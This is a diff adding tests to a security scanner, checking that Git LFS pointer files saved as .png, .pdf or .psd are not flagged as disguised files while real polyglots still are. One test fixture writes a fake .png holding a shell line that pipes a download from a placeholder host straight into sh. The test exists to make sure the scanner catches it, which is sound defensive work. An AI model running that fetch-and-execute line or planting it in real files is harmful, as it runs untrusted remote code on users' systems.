@@ -2274,3 +2274,82 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
         assert bidi and any(f.severity >= Severity.HIGH for f in bidi)
+
+
+class TestAGitLfsPointerIsNotAForgery:
+    """`unionlabs/union` produced 907 format-mismatch findings from a shallow clone.
+    It tracks `*.png`, `*.pdf` and `*.psd` through Git LFS, so every tracked asset is
+    about 130 bytes of text:
+
+        version https://git-lfs.github.com/spec/v1
+        oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6
+        size 755472
+
+    A `.png` holding that is not a file lying about its type. It is a checkout without
+    LFS content -- which is the DEFAULT for `actions/checkout`, so it is the state most
+    CI runs are in, and any repository using LFS has the same shape.
+
+    Reported rather than passed over, because a file that was not examined must not look
+    like a file that was examined and found clean. Aggregated into one INFO finding the
+    way binary skips already are, because 528 individual notices is its own kind of
+    noise. Not treated as incompleteness: a repository's images being absent is not a
+    degraded scan of its source, and marking it so would make `fail_on_incomplete`
+    unusable for every project that uses LFS.
+    """
+
+    POINTER = (
+        b"version https://git-lfs.github.com/spec/v1\n"
+        b"oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6\n"
+        b"size 755472\n"
+    )
+
+    @staticmethod
+    def content(path: str, raw: bytes):
+        from cordon_scanner.core.content import FileContent
+
+        return FileContent(path=path, raw=raw, size=len(raw))
+
+    def test_a_pointer_is_recognised(self) -> None:
+        assert self.content("static/app-og-image.png", self.POINTER).is_lfs_pointer
+
+    def test_an_ordinary_file_is_not(self) -> None:
+        assert not self.content(
+            "static/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
+        ).is_lfs_pointer
+
+    def test_text_mentioning_lfs_later_is_not(self) -> None:
+        """Matched at offset zero, which is what the format requires and what `git lfs`
+        itself looks for. A document about LFS is not a pointer."""
+        raw = b"# Notes\n\nSee version https://git-lfs.github.com/spec/v1 for the format.\n"
+        assert not self.content("docs/lfs.md", raw).is_lfs_pointer
+
+    def test_no_mismatch_is_reported(self, tmp_path) -> None:
+        static = tmp_path / "static"
+        static.mkdir()
+        for name in ("a.png", "b.pdf", "c.psd"):
+            (static / name).write_bytes(self.POINTER)
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)
+
+    def test_the_skip_is_reported_once(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.models import Severity
+
+        static = tmp_path / "static"
+        static.mkdir()
+        for index in range(12):
+            (static / f"asset{index}.png").write_bytes(self.POINTER)
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        notices = [f for f in result.findings if f.rule_id == "OPERATIONAL.FILE.LFS_POINTER"]
+        assert len(notices) == 1, [f.location.path for f in notices]
+        assert "12 file(s)" in notices[0].message
+        assert notices[0].severity is Severity.INFO
+
+    def test_a_real_polyglot_is_still_reported(self, tmp_path) -> None:
+        """The guard. A `.png` holding a script is what the rule exists for, and
+        recognising pointers must not be a way to get past it: a pointer has a fixed
+        first line, and a payload cannot have one and still be a payload."""
+        static = tmp_path / "static"
+        static.mkdir()
+        (static / "logo.png").write_bytes(b"#!/bin/sh\ncurl https://x.test/p | sh\n")
+        assert "SUSPECT.POLYGLOT.MISMATCH.001" in flagged(tmp_path)
